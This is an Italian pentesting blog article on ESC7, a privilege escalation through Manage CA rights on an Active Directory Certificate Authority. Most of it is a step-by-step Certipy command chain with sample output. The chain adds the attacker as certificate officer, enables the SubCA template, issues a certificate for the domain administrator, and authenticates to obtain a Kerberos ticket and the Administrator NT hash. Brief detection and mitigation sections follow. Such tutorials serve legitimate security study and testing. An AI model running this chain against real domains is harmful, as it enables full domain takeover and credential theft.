---
title: 'ESC7 ADCS: Privilege Escalation Tramite Manage CA su Active Directory'
slug: esc7-adcs
description: ESC7 su AD CS permette privilege escalation abusando dei permessi Manage CA e Manage Certificates. Guida pratica con Certipy per ottenere certificati Administrator.
image: /esc7.webp
draft: true
date: 2026-03-07T00:00:00.000Z
categories:
  - windows
subcategories:
  - privilege-escalation
tags:
  - ad
  - adcs
  - esc
  - certipy
---

ESC7 è una tecnica di **Active Directory Privilege Escalation tramite AD CS** che deriva da permessi pericolosi direttamente sulla **Certificate Authority**. In particolare quando un attaccante ottiene diritti come **Manage CA** o **Manage Certificates**, che permettono di controllare il comportamento della CA e il processo di emissione dei certificati.

Il permesso **Manage CA (ManageCa)** è il più critico. Consente di modificare la configurazione della CA, pubblicare template, assegnare ruoli (come Certificate Officer), avviare o fermare il servizio CA e modificare la sicurezza. Con questo livello di accesso un attaccante può forzare l'emissione di certificati arbitrari e ottenere accesso completo al dominio.

Il permesso **Manage Certificates (Certificate Officer)** permette invece di approvare o rifiutare richieste di certificati. Da solo non sempre porta a escalation immediata, ma combinato con altri fattori può permettere l'emissione di certificati per account privilegiati.

***

## Identificazione con Certipy

Certipy può individuare ESC7 enumerando i permessi sulla CA.

```bash
certipy find -u 'user@corp.local' -p 'Password123' -dc-ip 10.0.0.100 -vulnerable -enabled -stdout
```

Output tipico:

```
Certificate Authorities
  CA Name                             : CORP-CA
  DNS Name                            : CA.CORP.LOCAL

  Permissions
    Access Rights
      ManageCa                        : CORP.LOCAL\Authenticated Users
                                        CORP.LOCAL\Domain Admins
                                        CORP.LOCAL\Enterprise Admins

  [+] User ACL Principals             : CORP.LOCAL\Authenticated Users

  [!] Vulnerabilities
    ESC7                              : User has dangerous permissions.
```

Indicatori chiave:

* `ManageCa` assegnato a gruppi troppo ampi
* `[!] Vulnerabilities ESC7`
* `User ACL Principals` indica che l'utente corrente possiede questi diritti

***

## Exploit ESC7 ADCS con Certipy

Uno dei metodi più efficaci sfrutta il template **SubCA**, che permette di specificare il subject e possiede EKU molto permissivi.

L'attaccante utilizza i permessi **Manage CA** per:

1. aggiungersi come Certificate Officer
2. abilitare il template SubCA
3. inviare una richiesta certificato
4. approvarla manualmente
5. recuperare il certificato

***

### Step 1 — Aggiungi te stesso come officer

```bash
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -add-officer 'attacker'
```

***

### Step 2 — Abilita il template SubCA

```bash
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -enable-template 'SubCA'
```

***

### Step 3 — Richiedi certificato come Administrator

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'SubCA' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

Output tipico:

```
Request ID is 1
CERTSRV_E_TEMPLATE_DENIED
Would you like to save the private key? (y/N): y
Saving private key to '1.key'
```

La richiesta viene rifiutata ma genera **Request ID** e salva la chiave privata.

***

### Step 4 — Approva la richiesta

```bash
certipy ca \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -ns '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -issue-request '1'
```

***

### Step 5 — Recupera il certificato

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -retrieve '1'
```

Output:

```
Got certificate with UPN 'administrator@corp.local'
Saving certificate and private key to 'administrator.pfx'
```

Ora l'attaccante possiede **administrator.pfx**.

***

### Autenticazione

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

Risultato:

* **TGT Kerberos**
* **NT hash Administrator**
* controllo completo del dominio

***

## Detection ESC7 ADCS

Controllare:

* permessi `ManageCa`
* permessi `ManageCertificates`
* template pubblicati sulla CA

Eventi utili:

* modifiche configurazione CA
* emissione certificati sospetti

***

## Mitigation ESC7 ADCS

La Certificate Authority è un asset **Tier-0**.

Misure principali:

* limitare **Manage CA** e **Manage Certificates** a pochi amministratori PKI
* non assegnare questi permessi a gruppi ampi
* monitorare modifiche ai template e richieste certificate

***

## FAQ — ESC7 ADCS

### Cos'è ESC7 in ADCS?

ESC7 è l'abuso dei permessi amministrativi sulla Certificate Authority, in particolare **Manage CA**.

### ESC7 permette Domain Admin?

Sì. Un attaccante può forzare l'emissione di certificati per utenti privilegiati.

### Qual è la differenza tra ESC7 e ESC4?

[ESC4](https://hackita.it/articoli/esc4-adcs) modifica un singolo template.
ESC7 compromette direttamente la **Certificate Authority**.

***

**Key Takeaway:** se un attaccante ottiene **Manage CA**, può manipolare l'intera infrastruttura AD CS ed emettere certificati arbitrari per qualsiasi utente.

***

> ESC7 mostra quanto sia critica la sicurezza della Certificate Authority. Per vedere tutte le tecniche certificate attack leggi la guida completa:
> [https://hackita.it/articoli/adcs-esc1-esc16](https://hackita.it/articoli/adcs-esc1-esc16)Continua con le escalation successive:
> [https://hackita.it/articoli/esc8-adcs](https://hackita.it/articoli/esc8-adcs) · [https://hackita.it/articoli/esc9-adcs](https://hackita.it/articoli/esc9-adcs)Se questo contenuto ti è utile puoi supportare il progetto HackIta su
> [https://hackita.it/supporto](https://hackita.it/supporto)Vuoi imparare pentesting Active Directory oppure testare la sicurezza della tua infrastruttura?
> [https://hackita.it/servizi](https://hackita.it/servizi)Riferimenti tecnici:
> [https://specterops.io/blog/2021/06/17/certified-pre-owned/](https://specterops.io/blog/2021/06/17/certified-pre-owned/)
> [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
> [https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/)
